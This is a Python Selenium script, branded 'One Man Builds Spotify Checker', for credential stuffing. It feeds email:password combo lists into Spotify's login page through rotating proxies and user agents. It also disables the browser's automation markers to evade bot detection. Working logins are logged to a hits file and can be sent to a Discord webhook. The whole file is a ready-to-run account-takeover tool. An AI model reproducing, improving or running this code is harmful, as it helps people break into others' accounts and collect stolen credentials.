from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException,WebDriverException
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import init,Style,Fore
from os import name,system
from random import choice
from threading import Thread,Lock
from sys import stdout
from datetime import datetime
import json
import requests

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title:str):
        if name == 'posix':
            stdout.write(f"\x1b]2;{title}\x07")
        elif name in ('ce', 'nt', 'dos'):
            system(f'title {title}')
        else:
            stdout.write(f"\x1b]2;{title}\x07")

    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds Spotify Checker Selenium Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries}')
            sleep(0.1)

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('[Data]/useragents.txt','r')
        return choice(useragents)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        if self.proxy_type == 1:
            return f'http://{choice(proxies_file)}'
        elif self.proxy_type == 2:
            return f'socks4://{choice(proxies_file)}'
        elif self.proxy_type == 3:
            return f'socks5://{choice(proxies_file)}'

    def GetRandomProxyForWebhook(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies

    def ReadJson(self,filename,method):
        with open(filename,method) as f:
            return json.load(f)

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def close_driver(self,method_name,driver):
        self.PrintText(Fore.WHITE,Fore.YELLOW,method_name,'CLOSING WEBDRIVER')
        driver.quit()

    def __init__(self):
        self.SetTitle('[One Man Builds Spotify Checker Selenium Tool]')
        self.clear()
        init(convert=True)
        self.lock = Lock()
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.webhook_retries = 0

        self.title = Style.BRIGHT+Fore.GREEN+"""
                                 ╔══════════════════════════════════════════════════╗
                                      ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                      ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                      ╚═╝╩  ╚═╝ ╩ ╩╚   ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                 ╚══════════════════════════════════════════════════╝


        """
        print(self.title)

        config = self.ReadJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.headless = config['headless']
        self.website_load_max_wait = config['website_load_max_wait']
        self.login_check_max_wait = config['login_check_max_wait']
        self.wait_before_start = config['wait_before_start']
        self.browser_amount = config['browser_amount']
        self.webhook_enable = config['webhook_enable']
        self.webhook_url = config['webhook_url']

        print('')

    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
        try:
            timestamp = str(datetime.utcnow())

            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
            
            headers = {
                'User-Agent':useragent,
                'Pragma':'no-cache',
                'Accept':'*/*',
                'Content-Type':'application/json'
            }

            payload = json.dumps(message_to_send)

            if self.use_proxy == 1:
                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
            else:
                response = requests.post(self.webhook_url,data=payload,headers=headers)

            if response.text == "":
                pass
            elif "You are being rate limited." in response.text:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
            else:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
        except:
            self.webhook_retries += 1
            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)

    def Login(self,email,password):
        try:
            options = Options()

            useragent = self.GetRandomUserAgent()

            if self.headless == 1:
                options.add_argument('--headless')

            options.add_argument(f'--user-agent={useragent}')
            options.add_argument('--no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxy()))

            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument("window-size=1280,800")
            options.add_argument('--disable-blink-features=AutomationControlled')

            driver = webdriver.Chrome(options=options)

            driver.get('https://accounts.spotify.com/en/login/')

            try:
                WebDriverWait(driver,self.website_load_max_wait).until(EC.visibility_of_element_located((By.ID,'login-username'))).send_keys(email)
                try:
                    WebDriverWait(driver,self.website_load_max_wait).until(EC.visibility_of_element_located((By.ID,'login-password'))).send_keys(password)
                    try:
                        WebDriverWait(driver,self.website_load_max_wait).until(EC.element_to_be_clickable((By.ID,'login-button'))).click()
                        try:
                            url_to_be_present = EC.url_contains('https://accounts.spotify.com/en/status')
                            WebDriverWait(driver, self.login_check_max_wait).until(url_to_be_present)
                            self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{email}:{password}')
                            with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                                f.write(f'{email}:{password}\n')
                            self.hits += 1
                            if self.webhook_enable == 1:
                                self.SendWebhook('Spotify Account',f'{email}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/768px-Spotify_logo_without_text.svg.png',self.GetRandomProxyForWebhook(),useragent)
                        except TimeoutException:
                            self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{email}:{password}')
                            with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                                f.write(f'{email}:{password}\n')
                            self.bads += 1
                    except TimeoutException:
                        self.retries += 1
                        self.close_driver('CAN NOT PRESS LOGIN BUTTON',driver)
                        self.Login(email,password)
                except TimeoutException:
                    self.retries += 1
                    self.close_driver('CAN NOT ENTER PASSWORD',driver)
                    self.Login(email,password)
            except TimeoutException:
                self.retries += 1
                self.close_driver('CAN NOT ENTER USERNAME',driver)
                self.Login(email,password)
        except WebDriverException:
            self.retries += 1
            self.close_driver('LOGIN',driver)
            self.Login(email,password)
        finally:
            self.close_driver('PROCESS FINISHED',driver)
        
    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('[Data]/combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
            for combo in combos:
                username = combo.split(':')[0]
                password = combo.split(':')[-1]
                ex.submit(self.Login,username,password)
                if self.wait_before_start > 0:
                    sleep(self.wait_before_start)

if __name__ == '__main__':
    main = Main()
    main.Start()